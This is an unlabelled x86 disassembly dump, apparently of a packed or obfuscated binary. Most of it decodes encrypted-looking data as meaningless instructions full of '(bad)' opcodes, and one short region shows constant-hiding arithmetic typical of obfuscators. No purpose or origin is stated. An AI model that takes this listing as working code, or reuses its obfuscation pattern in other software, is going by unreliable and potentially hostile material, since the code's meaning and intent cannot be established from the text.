  40fc90:	fbld   TBYTE PTR [esi-0x49]
  40fc93:	cwde   
  40fc94:	nop
  40fc95:	nop
  40fc96:	pop    es
  40fc97:	mov    gs,WORD PTR [edi]
  40fc99:	push   esp
  40fc9a:	xor    DWORD PTR [esi-0x47],edi
  40fc9d:	fldcw  WORD PTR [esi+0x3e5a5a17]
  40fca3:	adc    DWORD PTR [ebp+eax*8+0x4b],0x7b
  40fca8:	xchg   esi,eax
  40fca9:	xchg   ebx,eax
  40fcaa:	inc    ebp
  40fcab:	imul   esp,DWORD PTR [ebx+0x4e],0x20
  40fcaf:	pop    edx
  40fcb0:	push   0xffffffc8
  40fcb2:	mov    bl,0x51
  40fcb4:	ror    DWORD PTR [ecx],cl
  40fcb6:	js     0x40fc83
  40fcb8:	xchg   esp,eax
  40fcb9:	push   edx
  40fcba:	jns    0x40fc7e
  40fcbc:	inc    edx
  40fcbd:	xchg   edi,eax
  40fcbe:	mov    al,BYTE PTR [eax-0x59]
  40fcc1:	je     0x40fcb1
  40fcc3:	nop
  40fcc4:	mov    ds:0x6696dfec,eax
  40fcc9:	pushw  0x74
  40fccc:	(bad)  
  40fccd:	(bad)  
  40fcce:	lods   eax,DWORD PTR ds:[esi]
  40fccf:	pop    edx
  40fcd0:	mov    ah,0x35
  40fcd2:	sub    BYTE PTR [edx-0x67],bh
  40fcd5:	sbb    esp,DWORD PTR ds:0xb8d7c4fd
  40fcdb:	cli    
  40fcdc:	push   ecx
  40fcdd:	cmp    al,0xfa
  40fcdf:	mov    edi,0x62098d24
  40fce4:	cli    
  40fce5:	cli    
  40fce6:	(bad)  
  40fce7:	xchg   ecx,eax
  40fce8:	xchg   edx,eax
  40fce9:	inc    esi
  40fcea:	(bad)  
  40fceb:	clc    
  40fcec:	push   esi
  40fced:	std    
  40fcee:	popa   
  40fcef:	arpl   dx,bx
  40fcf1:	out    0x23,al
  40fcf3:	xchg   edi,eax
  40fcf4:	sub    eax,0xea446b65
  40fcf9:	push   ebx
  40fcfa:	in     al,dx
  40fcfb:	stc    
  40fcfc:	out    0xfe,eax
  40fcfe:	fld    TBYTE PTR [edx-0x2e187cc7]
  40fd04:	xor    al,0xf0
  40fd06:	iret   
  40fd07:	pop    edi
  40fd08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd09:	push   edi
  40fd0a:	inc    edi
  40fd0b:	mov    ebx,0x892d76a
  40fd10:	out    dx,eax
  40fd11:	repnz push ebp
  40fd13:	push   ds
  40fd14:	imul   ecx,DWORD PTR [ebx-0x33e11f3e],0xffffffa2
  40fd1b:	scas   eax,DWORD PTR es:[edi]
  40fd1c:	mov    ebx,0x324a61f4
  40fd21:	dec    edx
  40fd22:	fist   DWORD PTR gs:[edi]
  40fd25:	sbb    esi,ebp
  40fd27:	mov    eax,ds:0x2967ee78
  40fd2c:	push   ss
  40fd2d:	inc    eax
  40fd2e:	and    ebx,DWORD PTR [ecx-0x2c49d025]
  40fd34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd35:	mov    BYTE PTR [ecx+0x7e],dl
  40fd38:	scas   al,BYTE PTR es:[edi]
  40fd39:	mov    ds:0x4554b8af,eax
  40fd3e:	mov    ecx,0xc5f826f9
  40fd43:	pop    edx
  40fd44:	dec    esi
  40fd45:	mov    ecx,0x8440c12e
  40fd4a:	in     al,dx
  40fd4b:	mov    edi,0x655bebd9
  40fd50:	sahf   
  40fd51:	push   ds
  40fd52:	repz push esp
  40fd54:	mov    bl,0x1c
  40fd56:	(bad)  
  40fd57:	push   edx
  40fd58:	mov    ds:0xc5668ef7,al
  40fd5d:	stos   DWORD PTR es:[edi],eax
  40fd5e:	jnp    0x40fdaa
  40fd60:	inc    esi
  40fd61:	scas   al,BYTE PTR es:[edi]
  40fd62:	in     eax,dx
  40fd63:	xchg   ecx,eax
  40fd64:	fmul   QWORD PTR [esi+edx*8+0xd8fd0c6]
  40fd6b:	sub    bl,BYTE PTR [esi]
  40fd6d:	and    DWORD PTR [eax-0x4cf2afa0],0xe209cea4
  40fd77:	jae    0x40fdf4
  40fd79:	pop    esp
  40fd7a:	enter  0x6141,0x4b
  40fd7e:	retf   
  40fd7f:	in     eax,0x6b
  40fd81:	out    dx,al
  40fd82:	adc    edi,DWORD PTR [esp+ecx*1-0x37]
  40fd86:	inc    esp
  40fd87:	sbb    al,0xc5
  40fd89:	mov    ds:0x215205f7,al
  40fd8e:	pop    edx
  40fd8f:	mov    edx,0x69303641
  40fd94:	sbb    BYTE PTR [edi-0x7f97311],0x4a
  40fd9b:	lea    edx,[ebp-0x76bfea86]
  40fda1:	retf   
  40fda2:	mov    DWORD PTR ds:0x2eaa3057,esp
  40fda8:	fisttp WORD PTR [eax]
  40fdaa:	clc    
  40fdab:	ret    
  40fdac:	cwde   
  40fdad:	dec    eax
  40fdae:	stc    
  40fdaf:	shr    eax,1
  40fdb1:	add    eax,0xb101bbfc
  40fdb6:	jle    0x40fdab
  40fdb8:	inc    esp
  40fdb9:	sar    BYTE PTR [edx-0x30],1
  40fdbc:	adc    al,0xd6
  40fdbe:	jb     0x40fd46
  40fdc0:	fldcw  WORD PTR [edx]
  40fdc2:	(bad)
  40fdc5:	adc    DWORD PTR [ebx+0x1f],ebx
  40fdc8:	or     eax,0x4f186f29
  40fdcd:	jne    0x40fe3f
  40fdcf:	arpl   cx,sp
  40fdd1:	and    eax,0x23498be9
  40fdd6:	adc    bl,0xcd
  40fdd9:	mov    edx,ebp
  40fddb:	xor    DWORD PTR [ebx-0x7a],0xfccf3352
  40fde2:	pop    esp
  40fde3:	mov    edx,0x924ccca6
  40fde8:	push   ds
  40fde9:	fmul   QWORD PTR [edx+ebx*1+0x65f52417]
  40fdf0:	pusha  
  40fdf1:	cmp    ebp,ebx
  40fdf3:	sbb    BYTE PTR [edi],bh
  40fdf5:	aam    0x84
  40fdf7:	and    BYTE PTR [ebx-0x7d],al
  40fdfa:	icebp  
  40fdfb:	xchg   eax,edi
  40fdfd:	out    dx,eax
  40fdfe:	xor    DWORD PTR [eax],edi
  40fe00:	mov    esi,DWORD PTR [ebx+0x10]
  40fe03:	dec    esp
  40fe04:	mov    ds:0x914ef4c6,eax
  40fe09:	xor    bh,BYTE PTR [edi-0x3c243126]
  40fe0f:	mov    al,ds:0x22b309f1
  40fe14:	shr    DWORD PTR [edx-0x537cbba2],0xdf
  40fe1b:	cmp    al,0x6c
  40fe1d:	push   0x411f89dd
  40fe22:	or     BYTE PTR ss:[ebx+ebx*8-0x7cd47883],dl
  40fe2a:	xor    eax,DWORD PTR [edi]
  40fe2c:	lock mov ds:0x16fac909,eax
  40fe32:	mov    edi,0xf8d77afc
  40fe37:	repz push eax
  40fe39:	std    
  40fe3a:	jecxz  0x40fe0a
  40fe3c:	sbb    DWORD PTR [eax-0x1b],ebx
  40fe3f:	mov    dl,0x40
  40fe41:	in     eax,dx
  40fe42:	xchg   edi,eax
  40fe43:	push   ebp
  40fe44:	xchg   edi,eax
  40fe45:	jecxz  0x40fe2c
  40fe47:	leave  
  40fe48:	lahf   
  40fe49:	or     eax,0x9250dced
  40fe4e:	sub    eax,edi
  40fe50:	xor    DWORD PTR [eax-0x4684aebf],edx
  40fe56:	in     eax,dx
  40fe57:	jno    0x40fe61
  40fe59:	pop    ebx
  40fe5a:	adc    DWORD PTR [eax-0x20],edi
  40fe5d:	inc    eax
  40fe5e:	aas    
  40fe5f:	xor    eax,0x32f9f7a9
  40fe64:	inc    esp
  40fe65:	pop    edi
  40fe66:	xor    eax,0x82376214
  40fe6b:	ret    0x9a08
  40fe6e:	mov    bh,0x62
  40fe70:	sub    al,0xb8
  40fe72:	stc    
  40fe73:	dec    edi
  40fe74:	xor    DWORD PTR [edx*2+0x1b786e30],0x7c
  40fe7c:	popf   
  40fe7d:	xchg   esp,eax
  40fe7e:	or     eax,0x3f8eefc9
  40fe83:	inc    ebx
  40fe84:	mov    cl,0x99
  40fe86:	sbb    eax,0x1513f1b4
  40fe8b:	inc    edi
  40fe8c:	inc    ebp
  40fe8d:	ss add eax,0x5fa58c8
  40fe93:	out    dx,al
  40fe94:	stos   DWORD PTR es:[edi],eax
  40fe95:	pop    eax
  40fe96:	add    ecx,DWORD PTR [eax]
  40fe98:	in     eax,0x93
  40fe9a:	push   0x60
  40fe9c:	pop    eax
  40fe9d:	inc    esp
  40fe9e:	mov    bl,0xd3
  40fea0:	sbb    eax,0xd0e8c49c
  40fea5:	ds cmc 
  40fea7:	nop
  40fea8:	(bad)  
  40fea9:	je     0x40fe2b
  40feab:	xor    al,bh
  40fead:	and    bh,BYTE PTR [edi+0x6ae4f2f0]
  40feb3:	and    ch,BYTE PTR [edx]
  40feb5:	in     al,0xf2
  40feb7:	call   0xec88:0x13e6bb64
  40febe:	in     al,0xe4
  40fec0:	fwait
  40fec1:	add    eax,0x8db5facf
  40fec6:	rcr    BYTE PTR [ecx-0x5d],1
  40fec9:	call   0x276b:0xc746e270
  40fed0:	or     BYTE PTR [edx+0x39],bh
  40fed3:	jle    0x40ff48
  40fed5:	int    0xe1
  40fed7:	test   BYTE PTR [ebx+eax*2-0x7a],al
  40fedb:	sbb    DWORD PTR ds:0x9dfb,ecx
  40fee0:	add    DWORD PTR [edx-0x9326ef],0xffffff95
  40fee7:	lods   al,BYTE PTR ds:[esi]
  40fee8:	ret    
  40fee9:	je     0x40ff1c
  40feeb:	xor    al,BYTE PTR [eax+0x60]
  40feee:	dec    esi
  40feef:	(bad)  
  40fef0:	xlat   BYTE PTR ds:[ebx]
  40fef1:	xchg   edi,eax
  40fef2:	mov    al,0xe2
  40fef4:	scas   eax,DWORD PTR es:[edi]
  40fef5:	mov    al,0x8f
  40fef7:	repz add BYTE PTR [esi+ebx*4-0x60],cl
  40fefc:	mov    eax,0x1fc816b8
  40ff01:	sar    BYTE PTR ds:0xed96d046,1
  40ff07:	(bad)  
  40ff08:	imul   DWORD PTR [ebx+0x4470be7b]
  40ff0e:	push   edx
  40ff0f:	(bad)  
  40ff10:	jecxz  0x40ff65
  40ff12:	inc    ecx
  40ff13:	push   ss
  40ff14:	pop    ss
  40ff15:	adc    DWORD PTR ss:[edi],ebx
  40ff18:	sbb    eax,DWORD PTR [esi-0x5c31d801]
  40ff1e:	in     eax,dx
  40ff1f:	test   ecx,ebp
  40ff21:	add    DWORD PTR [esi+esi*2-0x4],esi
  40ff25:	imul   esi,DWORD PTR [ecx-0x80],0x67f993e
  40ff2c:	iret   
  40ff2d:	cld    
  40ff2e:	xor    eax,DWORD PTR [ecx]
  40ff30:	inc    esi
  40ff31:	mov    bh,0x29
  40ff33:	or     al,0x58
  40ff35:	in     eax,0xfd
  40ff37:	pop    eax
  40ff38:	aad    0x7
  40ff3a:	test   eax,0x939a0a94
  40ff3f:	(bad)  
  40ff40:	xor    ecx,edi
  40ff42:	dec    esi
  40ff43:	push   edx
  40ff44:	jns    0x40ffa4
  40ff46:	inc    ecx
  40ff47:	mov    al,BYTE PTR [esi]
  40ff49:	xchg   edi,eax
  40ff4a:	pushf  
  40ff4b:	fist   WORD PTR [edx]
  40ff4d:	mov    al,0xf3
  40ff4f:	mov    ds:0x65672c2c,eax
  40ff54:	mov    esp,0x537e78ef
  40ff59:	popf   
  40ff5a:	jle    0x40feef
  40ff5c:	psubq  mm2,QWORD PTR [ecx-0x4528dc4e]
  40ff63:	cmp    cl,ch
  40ff65:	fs std 
  40ff67:	nop
  40ff68:	jmp    0x5880b611
  40ff6d:	sub    DWORD PTR ds:0x135f7ddb,edx
  40ff73:	and    eax,0x5eddbc73
  40ff78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff79:	jmp    0x40ff43
  40ff7b:	pop    esi
  40ff7c:	cwde   
  40ff7d:	pusha  
  40ff7e:	js     0x40ff33
  40ff80:	mov    bl,dh
  40ff82:	fs xor al,0xa3
  40ff85:	sbb    DWORD PTR [ebx],ebp
  40ff87:	loop   0x40ff0c
  40ff89:	aam    0x33
  40ff8b:	sub    esi,ebx
  40ff8d:	lea    esp,[edi]
  40ff8f:	cld    
  40ff90:	push   ds
  40ff91:	push   es
  40ff92:	sbb    DWORD PTR [edi-0x5],0x4d1e187f
  40ff99:	push   eax
  40ff9a:	es jge 0x40ff3c
  40ff9d:	pop    ebx
  40ff9e:	enter  0x3366,0x29
  40ffa2:	inc    ecx
  40ffa3:	add    dl,BYTE PTR [ebx+0x39971a15]
  40ffa9:	add    dh,al
  40ffab:	pop    edx
  40ffac:	repz pop DWORD PTR [esi-0x35]
  40ffb0:	adc    DWORD PTR [eax],0x6ac47842
  40ffb6:	scas   eax,DWORD PTR es:[edi]
  40ffb7:	mov    ds:0x116d4dca,eax
  40ffbc:	and    cl,bh
  40ffbe:	mov    al,ds:0x351b0dea
  40ffc3:	lods   eax,DWORD PTR ds:[esi]
  40ffc4:	shl    DWORD PTR [ebp+0x4f1fb3d5],cl
  40ffca:	dec    BYTE PTR [ecx]
  40ffcc:	dec    ecx
  40ffcd:	sub    DWORD PTR [esi-0x3b],ebp
  40ffd0:	xchg   DWORD PTR [esi-0x35481974],esp
  40ffd6:	ds mov ch,0x23
  40ffd9:	icebp  
  40ffda:	(bad)  
  40ffdb:	mov    ds:0x1a47b36d,al
  40ffe0:	sbb    BYTE PTR [esi+0x7f],dh
  40ffe3:	lods   eax,DWORD PTR ds:[esi]
  40ffe4:	imul   esi,esp,0x12354a1
  40ffea:	ss dec ebp
  40ffec:	or     DWORD PTR [eax],edx
  40ffee:	cmp    ebp,DWORD PTR [edi+0x8]
  40fff1:	xor    al,0x7
  40fff3:	lods   al,BYTE PTR ds:[esi]
  40fff4:	lahf   
  40fff5:	cmp    DWORD PTR [ebx],esi
  40fff7:	xchg   esp,eax
  40fff8:	mov    WORD PTR [edx-0x359d63b2],?
  40fffe:	sbb    bh,BYTE PTR [edi+0x510424e2]
  410004:	push   esi
  410005:	mov    edi,ds
  410007:	jo     0x40ffd2
  410009:	sub    BYTE PTR [eax],0xa0
  41000c:	add    cl,BYTE PTR fs:[esp+ebp*2+0x6393b7e]
  410014:	stc    
  410015:	jmp    FWORD PTR [edi-0x76]
  410018:	push   ds
  410019:	addr16 xor al,0xc
  41001c:	xor    ah,dh
  41001e:	mov    esp,ebp
  410020:	mov    esi,0xfcd413f5
  410025:	cmp    ebp,edi
  410027:	cmp    edi,DWORD PTR [eax+0x45]
  41002a:	(bad)  
  41002b:	adc    eax,0x50380724
  410030:	mov    dl,0x73
  410032:	retf   0x976f
  410035:	mov    bl,BYTE PTR [ecx-0x18666f92]
  41003b:	adc    DWORD PTR [ebx+0x2842e32a],edx
  410041:	addr16 jle 0x41007e
  410044:	inc    esi
  410045:	repnz in eax,0xb6
  410048:	es (bad) 
  41004b:	popf   
  41004c:	icebp  
  41004d:	addr16 hlt 
  41004f:	rcr    BYTE PTR [edi-0xa],1
  410052:	loop   0x4100c0
  410054:	ret    
  410055:	add    esi,ecx
  410057:	retf   0xf48e
  41005a:	into   
  41005b:	fistp  WORD PTR [ecx]
  41005d:	stc    
  41005e:	mov    al,0x44
  410060:	(bad)  
  410061:	cdq    
  410062:	xor    esp,edi
  410064:	dec    ebx
  410065:	mov    cl,0xc9
  410067:	dec    ecx
  410068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410069:	jbe    0x410035
  41006b:	xor    ah,BYTE PTR [ebx+0x32]
  41006e:	dec    edx
  41006f:	(bad)  
  410070:	push   0x4238d04f
  410075:	inc    esp
  410076:	xchg   edx,eax
  410077:	push   edx
  410078:	in     al,dx
  410079:	add    BYTE PTR [ebx],ah
  41007b:	ret    
  41007c:	push   0x9d9e0327
  410081:	add    ch,ch
  410083:	sub    al,0xba
  410085:	cwde   
  410086:	xchg   DWORD PTR [ebx+0x56],ebp
  410089:	xor    eax,0x267a09f2
  41008e:	jmp    0xb84c:0x8d75ceda
  410095:	iret   
  410096:	mov    ebx,0x603e94b4
  41009b:	and    al,0xf6
  41009d:	jmp    0x67cb17
  4100a2:	cmp    edi,ecx
  4100a4:	xor    ebx,DWORD PTR [ebp-0x73]
  4100a7:	dec    esi
  4100a8:	mov    gs,ebp
  4100aa:	in     al,0xbd
  4100ac:	int3   
  4100ad:	adc    edx,DWORD PTR [edx+0x68b14ac3]
  4100b3:	lahf   
  4100b4:	or     DWORD PTR [edi],esp
  4100b6:	jmp    0x4100c0
  4100b8:	lods   eax,DWORD PTR ds:[esi]
  4100b9:	cwde   
  4100ba:	mov    ecx,0x2ddafad1
  4100bf:	adc    al,BYTE PTR ds:0x7a0e05e1
  4100c5:	pushf  
  4100c6:	mov    ch,0x9d
  4100c8:	enter  0xf7ee,0x45
  4100cc:	mov    al,bl
  4100ce:	nop
  4100cf:	sbb    esp,DWORD PTR [eax+edx*2]
  4100d2:	arpl   WORD PTR [ecx-0x74],cx
  4100d5:	retf   
  4100d6:	xchg   ebp,eax
  4100d7:	inc    ecx
  4100d8:	pop    eax
  4100d9:	nop
  4100da:	imul   ch
  4100dc:	dec    ecx
  4100dd:	mov    DWORD PTR [esi-0x3c],ebp
  4100e0:	mov    ebx,0x7234ecf8
  4100e5:	pop    edx
  4100e6:	xchg   DWORD PTR [edi],ecx
  4100e8:	jo     0x410081
  4100ea:	fidivr DWORD PTR [edx+0x42]
  4100ed:	push   es
  4100ee:	cmp    al,0x6a
  4100f0:	out    0xe2,eax
  4100f2:	add    DWORD PTR [edx],edx
  4100f4:	inc    ebp
  4100f5:	fcom   QWORD PTR ss:[ecx]
  4100f8:	xchg   ecx,eax
  4100f9:	adc    ah,ch
  4100fb:	call   0x11e1:0x7cd4f17d
  410102:	or     BYTE PTR [edx-0x52842ce5],0x39
  410109:	sbb    edx,DWORD PTR [edx+ebx*4]
  41010c:	adc    DWORD PTR [edx-0x434dc47f],edx
  410112:	add    DWORD PTR [esi+ebp*1-0x81f10b2],esi
  410119:	jnp    0x4100e6
  41011b:	je     0x41012d
  41011d:	fcmovne st,st(0)
  41011f:	jp     0x4100f7
  410121:	arpl   WORD PTR [eax+0x5ee1638],dx
  410127:	cld    
  410128:	or     eax,0xd42ffae8
  41012d:	mov    ch,0xe9
  41012f:	xor    eax,0x19a99cd9
  410134:	and    ah,BYTE PTR [esi]
  410136:	adc    dh,bh
  410138:	clc    
  410139:	mov    dl,0x60
  41013b:	retf   0x656e
  41013e:	mov    dl,0xe6
  410140:	in     al,dx
  410141:	mov    BYTE PTR [edx-0x57],bh
  410144:	(bad)  
  410145:	bound  ebx,QWORD PTR [esi]
  410147:	sub    eax,0x3672b1eb
  41014c:	push   0x71
  41014e:	cli    
  41014f:	jb     0x4101ad
  410151:	shr    BYTE PTR [ecx+0x3d],1
  410154:	sbb    DWORD PTR [eax-0x1c],ebx
  410157:	(bad)  
  410158:	mov    ch,0xd9
  41015a:	pop    ds
  41015b:	retf   0xb9bc
  41015e:	test   eax,0x9301c1c1
  410163:	add    bl,al
  410165:	loopne 0x410183
  410167:	dec    eax
  410168:	(bad)  
  410169:	aas    
  41016a:	pop    ebx
  41016b:	mov    al,0x11
  41016d:	enter  0xc0f0,0x55
  410171:	es cwde 
  410173:	das    
  410174:	in     eax,0xcf
  410176:	pop    edx
  410177:	add    DWORD PTR [edx-0x2937a7ae],0xc92a1ada
  410181:	das    
  410182:	(bad)  
  410183:	mov    edi,0x10c14df3
  410188:	add    eax,0x2837be27
  41018d:	adc    esp,DWORD PTR [eax]
  41018f:	mov    cl,0xcb
  410191:	(bad)  
  410192:	test   BYTE PTR [esi],bh
  410194:	sti    
  410195:	mov    al,gs:0x1715d78f
  41019b:	xchg   ecx,eax
  41019c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019d:	nop
  41019e:	(bad)  
  41019f:	das    
  4101a0:	loopne 0x4101a3
  4101a2:	ds in  al,dx
  4101a4:	mov    ebx,0xa1ece267
  4101a9:	cmc    
  4101aa:	push   edi
  4101ab:	or     DWORD PTR [eax-0x43],ebx
  4101ae:	call   0x28c4:0xe304c5ca
  4101b5:	lock mov ds:0xcbfcbd60,eax
  4101bb:	repnz shl BYTE PTR ds:0x91991afe,1
  4101c2:	pop    ecx
  4101c3:	sahf   
  4101c4:	mov    cl,0x8d
  4101c6:	sub    BYTE PTR [esi-0x346ca938],0x30
  4101cd:	mov    al,0xe
  4101cf:	fisubr WORD PTR [esi-0x7c]
  4101d2:	arpl   WORD PTR [esi],bx
  4101d4:	xor    DWORD PTR [ecx+0x26],esp
  4101d7:	retf   
  4101d8:	mov    bh,0x7d
  4101da:	popf   
  4101db:	out    0xff,eax
  4101dd:	inc    ecx
  4101de:	pop    edi
  4101df:	mov    eax,ds:0x6c3b9410
  4101e4:	popf   
  4101e5:	mov    bl,0x3a
  4101e7:	ficom  DWORD PTR [ecx+0x23]
  4101ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101eb:	or     BYTE PTR [edi],dl
  4101ed:	sub    DWORD PTR [edx+0x48],0x2a7f6ac9
  4101f4:	jmp    DWORD PTR [esi-0xdf779e0]
  4101fa:	cmp    eax,0x77e23f00
  4101ff:	sbb    al,0x66
  410201:	sub    al,0xfd
  410203:	shr    BYTE PTR [edi+0x349efdb],cl
  410209:	(bad)  
  41020a:	mov    edi,DWORD PTR [edx]
  41020c:	gs push es
  41020e:	cdq    
  41020f:	mov    eax,0x412e3a40
  410214:	jecxz  0x410294
  410216:	mov    gs,ebx
  410218:	push   cs
  410219:	sar    dl,cl
  41021b:	repnz mov BYTE PTR ds:0x7d4ed03e,bl
  410222:	sahf   
  410223:	les    edi,FWORD PTR [ecx+0x657b0415]
  410229:	inc    esp
  41022a:	enter  0x99ea,0x60
  41022e:	aas    
  41022f:	cdq    
  410230:	add    eax,0xfd1216c1
  410235:	ret    0x269c
  410238:	sbb    DWORD PTR [ecx-0x38fc6e7c],esp
  41023e:	imul   eax,ebx
  410241:	cmp    eax,edx
  410243:	ja     0x4191d2
  410249:	mov    edx,DWORD PTR [ebp-0x10]
  41024c:	mov    eax,DWORD PTR [ebp-0x14]
  41024f:	mov    ebx,DWORD PTR [ebp-0x28]
  410252:	sub    eax,edx
  410254:	xor    ebx,esi
  410256:	xor    edx,edx
  410258:	add    ebx,edi
  41025a:	div    ebx
  41025c:	mov    DWORD PTR [ebp-0x8],eax
  41025f:	mov    eax,DWORD PTR [ebp-0x2c]
  410262:	mov    edx,DWORD PTR [ebp-0x8]
  410265:	xor    eax,esi
  410267:	add    eax,edi
  410269:	cmp    edx,eax
  41026b:	jbe    0x41027b
  410271:	mov    eax,DWORD PTR [ebp-0x2c]
  410274:	xor    eax,esi
  410276:	add    eax,edi
  410278:	mov    DWORD PTR [ebp-0x8],eax
  41027b:	mov    eax,DWORD PTR [ebp-0x28]
  41027e:	mov    edx,DWORD PTR [ebp-0x8]
  410281:	xor    eax,esi
  410283:	add    eax,edi
  410285:	imul   eax,edx
  410288:	mov    DWORD PTR [ebp-0x8],eax
  41028b:	mov    eax,DWORD PTR [ebp-0x3c]
  41028e:	mov    edx,DWORD PTR [ebp-0x8]
  410291:	xor    eax,esi
  410293:	add    eax,edi
  410295:	cmp    edx,eax
  410297:	je     0x4191bb
  41029d:	mov    eax,DWORD PTR [ebp-0x8]
  4102a0:	mov    DWORD PTR [ebp-0x20],eax
  4102a3:	mov    eax,DWORD PTR [ebp-0x10]
  4102a6:	add    eax,DWORD PTR [ebp-0x40]
  4102a9:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  4102b0:	mov    DWORD PTR [ebp-0x8],eax
  4102b3:	mov    eax,0xf89c85b5
  4102b8:	mov    DWORD PTR [ebp-0x1c],eax
  4102bb:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  4102c2:	mov    DWORD PTR [ebp-0x30],eax
  4102c5:	mov    eax,DWORD PTR [ebp-0x24]
  4102c8:	xor    eax,esi
  4102ca:	add    eax,edi
  4102cc:	jmp    0x416dfa
  4102d1:	mov    DWORD PTR [ebp-0x48],0xf89c85be
  4102d8:	mov    DWORD PTR [ebp-0x4c],0xf89c85a1
  4102df:	mov    eax,DWORD PTR [ebp-0x30]
  4102e2:	mov    edx,DWORD PTR [ebp-0xc]
  4102e5:	xor    eax,esi
  4102e7:	add    eax,edi
  4102e9:	imul   eax,edx
  4102ec:	mov    edx,DWORD PTR [ebp-0x1c]
  4102ef:	xor    edx,esi
  4102f1:	add    eax,edx
  4102f3:	mov    edx,DWORD PTR [ebp-0x8]
  4102f6:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  4102fd:	mov    BYTE PTR [ebp-0x1],al
  410300:	mov    eax,DWORD PTR [ebp-0x1c]
  410303:	mov    edx,DWORD PTR [ebp-0x1c]
  410306:	xor    eax,esi
  410308:	xor    edx,esi
  41030a:	lea    ebx,[eax+edx*1+0x64e5b6]
  410311:	mov    eax,DWORD PTR [ebp-0xc]
  410314:	xor    edx,edx
  410316:	div    ebx
  410318:	mov    eax,DWORD PTR [ebp-0x1c]
  41031b:	xor    eax,esi
  41031d:	add    eax,edi
  41031f:	cmp    edx,eax
  410321:	mov    eax,DWORD PTR [ebp-0x30]
  410324:	mov    edx,DWORD PTR [ebp-0xc]
  410327:	jmp    0x41269c
  41032c:	lods   al,BYTE PTR ds:[esi]
  41032d:	jbe    0x410322
  41032f:	loop   0x4102d4
  410331:	jmp    DWORD PTR [ebx-0x2d50dedc]
  410337:	into   
  410338:	inc    ecx
  410339:	sub    DWORD PTR [ebx+esi*1+0x62628ebf],0xa
  410341:	pop    edi
  410342:	bound  esp,QWORD PTR [edx-0x6a]
  410345:	mov    ?,ebx
  410347:	cmc    
  410348:	lods   al,BYTE PTR ds:[esi]
  410349:	mov    bl,0x89
  41034b:	ficom  DWORD PTR [eax]
  41034d:	cld    
  41034e:	gs jnp 0x41039a
  410351:	push   cs
  410352:	cmp    al,0x43
  410354:	test   esi,edx
  410356:	out    dx,eax
  410357:	inc    ecx
  410358:	inc    edx
  410359:	fldenv [eax]
  41035b:	ins    DWORD PTR es:[edi],dx
  41035c:	jmp    0x84a1:0xee70014a
  410363:	xlat   BYTE PTR ds:[ebx]
  410364:	or     DWORD PTR [edx],eax
  410366:	lock mov WORD PTR [eax+0x53],ds
  41036a:	in     al,dx
  41036b:	mov    cl,bh
  41036d:	cmp    ebp,DWORD PTR [ebx+esi*1]
  410370:	(bad)  
  410371:	jae    0x4103de
  410373:	clc    
  410374:	repz xlat BYTE PTR ds:[ebx]
  410376:	stc    
  410377:	js     0x4103d0
  410379:	nop
  41037a:	and    esi,ebp
  41037c:	jmp    0xc0b4:0x5d6ad13f
  410383:	jns    0x4103fe
  410385:	add    edi,ebp
  410387:	cld    
  410388:	mov    ebp,0xa4bff5ea
  41038d:	fmulp  st(0),st
  41038f:	lods   eax,DWORD PTR ds:[esi]
  410390:	in     al,0x13
  410392:	mov    ah,0x2f
  410394:	cmc    
  410395:	rol    BYTE PTR [edi],1
  410397:	jmp    0x8eafac0d
  41039c:	mov    ah,0xf2
  41039e:	leave  
  41039f:	mov    dh,0x25
  4103a1:	inc    ecx
  4103a2:	ret    
  4103a3:	je     0x4103d5
  4103a5:	(bad)  
  4103a7:	(bad)  
  4103a8:	lahf   
  4103a9:	cli    
  4103aa:	jl     0x410406
  4103ac:	sbb    DWORD PTR [eax-0x365a0111],0x7d83f94
  4103b6:	add    ebp,esi
  4103b8:	dec    ecx
  4103b9:	xchg   edi,eax
  4103ba:	xchg   esp,eax
  4103bb:	test   DWORD PTR [ebp-0x219d3387],eax
  4103c1:	xor    BYTE PTR [ebx],dh
  4103c3:	xor    DWORD PTR gs:[ebp-0x1c],ecx
  4103c7:	jns    0x41039b
  4103c9:	adc    edx,ebx
  4103cb:	or     al,0x3f
  4103cd:	(bad)  
  4103ce:	cmp    DWORD PTR [esi],ebx
  4103d0:	xor    BYTE PTR [edi],al
  4103d2:	or     eax,0x276dc904
  4103d7:	inc    ebx
  4103d8:	and    ecx,esi
  4103da:	xor    ch,BYTE PTR [ebx+0x127822f9]
  4103e0:	xchg   esi,eax
  4103e1:	mov    edx,0x4fa59806
  4103e6:	push   ebx
  4103e7:	in     al,dx
  4103e8:	jp     0x41042b
  4103ea:	pop    ecx
  4103eb:	or     ebp,DWORD PTR [di]
  4103ee:	addr16 inc edi
  4103f0:	cmp    al,0x6
  4103f2:	test   DWORD PTR [esi+0x6a],esp
  4103f5:	push   ebp
  4103f6:	je     0x410441
  4103f8:	inc    ecx
  4103f9:	or     al,0x48
  4103fb:	push   0x1c
  4103fd:	mov    edx,0xffa3ce5b
  410402:	sti    
  410403:	test   BYTE PTR [edi-0x26d93e0],0xe
  41040a:	push   0x37
  41040c:	mov    edx,0x985d81e9
  410411:	mov    ecx,0xb0ab292a
  410416:	jge    0x410463
  410418:	repz std 
  41041a:	stos   BYTE PTR es:[edi],al
  41041b:	xchg   edx,eax
  41041c:	cld    
  41041d:	push   0x66e0cc72
  410422:	jp     0x4103de
  410424:	cmp    dl,BYTE PTR [ebx-0x6e4380df]
  41042a:	dec    BYTE PTR [ebx]
  41042c:	pusha  
  41042d:	pushf  
  41042e:	(bad)  
  41042f:	int3   
  410430:	shl    BYTE PTR ds:0x2b360710,0xee
  410437:	loope  0x41042a
  410439:	jne    0x41042b
  41043b:	lods   al,BYTE PTR ds:[esi]
  41043c:	jg     0x4103cf
  41043e:	or     al,0xc5
  410440:	jp     0x41047f
  410442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410443:	mov    ebp,0x7c74fc34
  410448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410449:	ret    0xcc7a
  41044c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41044d:	push   ss
  41044e:	bound  ebp,QWORD PTR [esi-0x49d3466e]
  410454:	ds clc 
